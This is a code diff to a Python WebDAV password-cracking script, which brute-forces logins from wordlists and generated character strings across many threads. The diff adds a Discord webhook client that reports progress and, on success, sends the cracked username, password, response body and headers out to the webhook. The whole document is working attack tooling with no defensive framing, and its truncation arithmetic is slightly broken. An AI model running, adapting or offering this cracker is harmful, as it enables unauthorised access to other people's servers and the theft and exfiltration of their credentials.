@@ -14,6 +14,7 @@ import argparse
 import base64
 import itertools
 import json
+import queue
 import string
 import threading
 import time
@@ -21,7 +22,6 @@ from typing import Tuple
 
 import cbor
 import requests
-
 
 parser = argparse.ArgumentParser(
     "webdav cracker",
@@ -95,6 +95,12 @@ parser.add_argument(
     help="A CBOR file with passwords. After the file has been tried, the normal burte force mode turns on"
 )
 
+parser.add_argument(
+    "--webhook",
+    type=str,
+    help="A Discord webhook to which information is transmitted"
+)
+
 
 # get command line args
 args = parser.parse_args()
@@ -108,9 +114,6 @@ if args.url.endswith("/"):
 else:
     url = f"{args.url}/."
 
-# create webhook session
-discord = requests.session()
-
 # create WEBDAV session
 dav = requests.session()
 dav.headers = {
@@ -118,10 +121,45 @@ dav.headers = {
 }
 
 
+class Discord:
+    def __init__(self):
+        self.session = requests.session()
+        self.tasks = queue.Queue()
+
+    def run(self):
+        while True:
+            data = self.tasks.get()
+            while True:
+                r = self.session.post(
+                    args.webhook,
+                    json=data
+                )
+                if r.status_code == 429:
+                    time.sleep(r.json()['retry_after'] / 1000)
+                    continue
+                break
+            self.tasks.task_done()
+
+    def send(self, data) -> None:
+        self.tasks.put(data)
+
+
+discord = Discord()
+threading.Thread(target=discord.run, daemon=True).start()
+
+
 class WEBDAV:
     def __init__(self):
         self.started = False
         self.exit = None
+
+    def log(self, data):
+        msg = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}"
+        print(msg)
+        if args.webhook is not None:
+            discord.send({
+                "content": msg
+            })
 
     def run(self) -> Tuple[requests.Response, str]:
         # brute force password file
@@ -131,15 +169,15 @@ class WEBDAV:
                 while True:
                     if self.exit is not None:
                         return self.exit
-                    if threading.active_count() < args.threads + 1:
+                    if threading.active_count() < args.threads + 2:
                         passwords.append(password.strip())
                         if len(passwords) > 100:
-                            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] password list {index}")
+                            self.log(f"password list {index}")
                             threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
                             passwords = []
                         break
                     time.sleep(0.1)
-            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] password list end")
+            self.log("password list end")
             self.check_passwords(passwords)
         # brute force JSON password file
         if args.json_passwords is not None:
@@ -148,15 +186,15 @@ class WEBDAV:
                 while True:
                     if self.exit is not None:
                         return self.exit
-                    if threading.active_count() < args.threads + 1:
+                    if threading.active_count() < args.threads + 2:
                         passwords.append(password)
                         if len(passwords) > 100:
-                            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] JSON password list {index}")
+                            self.log(f"JSON password list {index}")
                             threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
                             passwords = []
                         break
                     time.sleep(0.1)
-            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] JSON password list end")
+            self.log("JSON password list end")
             self.check_passwords(passwords)
         # brute force CBOR password file
         if args.cbor_passwords is not None:
@@ -165,15 +203,15 @@ class WEBDAV:
                 while True:
                     if self.exit is not None:
                         return self.exit
-                    if threading.active_count() < args.threads + 1:
+                    if threading.active_count() < args.threads + 2:
                         passwords.append(password)
                         if len(passwords) > 100:
-                            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] CBOR password list {index}")
+                            self.log(f"CBOR password list {index}")
                             threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
                             passwords = []
                         break
                     time.sleep(0.1)
-            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] CBOR password list end")
+            self.log("CBOR password list end")
             self.check_passwords(passwords)
         # standard berute force
         i = len(args.start)
@@ -187,8 +225,8 @@ class WEBDAV:
                         if args.start != j:
                             break
                         self.started = True
-                    if threading.active_count() < args.threads + 1:
-                        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {j} ..")
+                    if threading.active_count() < args.threads + 2:
+                        self.log(f"{j} ..")
                         threading.Thread(target=self.brute_force, daemon=True, args=(j,)).start()
                         break
                     time.sleep(0.1)
@@ -233,3 +271,38 @@ print(r.headers)
 print("-" * 80)
 print(f"USER: {args.username}")
 print(f"PASSWORD: {password}")
+
+if args.webhook is not None:
+    if len(r.text) < 4000:
+        description = f"```html\n{r.text}\n```"
+    else:
+        description = f"```html\n{r.text[:4000]}\n```... ({4000 - len(r.text)})"
+    fields = []
+    for header in r.headers:
+        if len(r.headers[header]) < 1000:
+            value = f"`{r.headers[header]}`"
+        else:
+            value = f"`{r.headers[header][1000:]}` ... ({1000 - len(r.headers[header])})"
+        fields.append({
+            "name": header,
+            "value": value
+        })
+    discord.send({
+        "embeds": [
+            {
+                "title": password,
+                "description": description,
+                "color": 0x8E04B9,
+                "fields": fields,
+                "author": {
+                    "name": f"Password found for {args.username}"
+                },
+                "footer": {
+                    "text": f"status: {r.status_code}"
+                }
+            }
+        ]
+    })
+
+
+discord.tasks.join()
